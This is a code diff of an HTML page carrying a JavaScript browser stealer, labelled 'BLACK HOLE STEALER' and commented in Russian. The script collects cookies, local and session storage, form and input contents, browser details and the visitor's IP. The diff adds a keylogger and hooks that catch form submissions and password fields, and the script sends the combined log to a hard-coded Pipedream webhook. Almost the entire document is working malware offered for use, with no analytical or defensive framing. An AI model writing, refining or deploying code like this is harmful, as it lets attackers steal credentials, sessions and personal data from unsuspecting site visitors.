@@ -10,64 +10,102 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
 </head>
 <body>
 <script>
-// ===== BLACK HOLE STEALER - PIPEDREAM =====
+// ===== BLACK HOLE STEALER - ONE BIG LOG =====
 (function() {
-    // ===== ТВОЙ PIPEDREAM ВЕБХУК =====
+    // ===== ТВОЙ ВЕБХУК =====
     const WEBHOOK = 'https://eorw0sly29vshxa.m.pipedream.net';
     
-    // ===== ОТПРАВКА =====
-    function send(data) {
+    // ===== ОДИН БОЛЬШОЙ ЛОГ =====
+    const log = {
+        target: window.location.hostname || 'unknown',
+        url: window.location.href,
+        ip: 'unknown',
+        cookies: 'No cookies',
+        localStorage: {},
+        sessionStorage: {},
+        browser: {},
+        forms: [],
+        inputs: [],
+        plugins: [],
+        keylog: '',
+        submittedForms: [],
+        passwordCapture: {},
+        timestamp: new Date().toISOString()
+    };
+    
+    // ===== ОТПРАВКА ОДНОГО БОЛЬШОГО ЛОГА =====
+    function sendFinalLog() {
+        log.timestamp = new Date().toISOString();
         try {
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('[+] Data sent to Pipedream');
-                } else {
-                    console.log('[-] Failed to send data');
-                }
-            })
-            .catch(err => {
-                console.log('[-] Error: ' + err.message);
+                body: JSON.stringify(log)
             });
-        } catch(e) {
-            console.log('[-] Exception: ' + e.message);
-        }
+        } catch(e) {}
     }
     
     // ===== IP =====
-    let ip = 'unknown';
     fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
         .then(data => {
-            ip = data.ip;
-            collectAndSend();
+            log.ip = data.ip;
+            collectAllData();
         })
         .catch(() => {
-            collectAndSend();
+            collectAllData();
         });
     
-    function collectAndSend() {
+    // ===== KEYLOGGER (буферизация) =====
+    let keylogBuffer = '';
+    document.addEventListener('keydown', function(e) {
+        if (e.key.length === 1) {
+            keylogBuffer += e.key;
+        }
+        if (e.key === 'Enter' || e.key === 'Tab') {
+            if (keylogBuffer.length > 0) {
+                log.keylog += keylogBuffer + '\n';
+                keylogBuffer = '';
+            }
+        }
+    });
+    
+    // ===== ПЕРЕХВАТ SUBMIT =====
+    document.addEventListener('submit', function(e) {
+        const form = e.target;
+        const data = {};
+        new FormData(form).forEach((val, key) => data[key] = val);
+        log.submittedForms.push({
+            action: form.action || 'none',
+            method: form.method || 'GET',
+            data: data,
+            timestamp: new Date().toISOString()
+        });
+    }, true);
+    
+    // ===== ПЕРЕХВАТ ПАРОЛЕЙ =====
+    document.addEventListener('input', function(e) {
+        if (e.target.tagName === 'INPUT' && e.target.type === 'password') {
+            log.passwordCapture[e.target.name || e.target.id || 'password'] = e.target.value;
+        }
+    }, true);
+    
+    function collectAllData() {
         // ===== COOKIES =====
-        const cookies = document.cookie || 'No cookies';
+        log.cookies = document.cookie || 'No cookies';
         
         // ===== LOCAL STORAGE =====
-        const ls = {};
         for (let key in localStorage) {
-            try { ls[key] = localStorage[key]; } catch(e) {}
+            try { log.localStorage[key] = localStorage[key]; } catch(e) {}
         }
         
         // ===== SESSION STORAGE =====
-        const ss = {};
         for (let key in sessionStorage) {
-            try { ss[key] = sessionStorage[key]; } catch(e) {}
+            try { log.sessionStorage[key] = sessionStorage[key]; } catch(e) {}
         }
         
         // ===== BROWSER INFO =====
-        const browser = {
+        log.browser = {
             userAgent: navigator.userAgent,
             language: navigator.language,
             platform: navigator.platform,
@@ -78,12 +116,11 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
             timestamp: new Date().toISOString()
         };
         
-        // ===== FORMS (passwords, logins) =====
-        const forms = [];
+        // ===== FORMS =====
         document.querySelectorAll('form').forEach(form => {
             const data = {};
             new FormData(form).forEach((val, key) => data[key] = val);
-            forms.push({
+            log.forms.push({
                 action: form.action || 'none',
                 method: form.method || 'GET',
                 data: data
@@ -91,9 +128,8 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
         });
         
         // ===== INPUTS =====
-        const inputs = [];
         document.querySelectorAll('input, textarea, select').forEach(el => {
-            inputs.push({
+            log.inputs.push({
                 tag: el.tagName,
                 type: el.type || 'text',
                 name: el.name || '',
@@ -104,26 +140,18 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
         });
         
         // ===== PLUGINS =====
-        const plugins = [];
         for (let i = 0; i < navigator.plugins.length; i++) {
-            plugins.push(navigator.plugins[i].name);
+            log.plugins.push(navigator.plugins[i].name);
         }
         
-        // ===== ONE BIG LOG =====
-        const log = {
-            ip: ip,
-            cookies: cookies,
-            localStorage: ls,
-            sessionStorage: ss,
-            browser: browser,
-            forms: forms,
-            inputs: inputs,
-            plugins: plugins,
-            timestamp: new Date().toISOString()
-        };
+        // ===== ДОБАВЛЯЕМ КЛЮЧЕЛОГ =====
+        if (keylogBuffer.length > 0) {
+            log.keylog += keylogBuffer;
+            keylogBuffer = '';
+        }
         
-        // ===== SEND =====
-        send(log);
+        // ===== ОТПРАВЛЯЕМ ОДИН БОЛЬШОЙ ЛОГ =====
+        sendFinalLog();
     }
 })();
 </script>
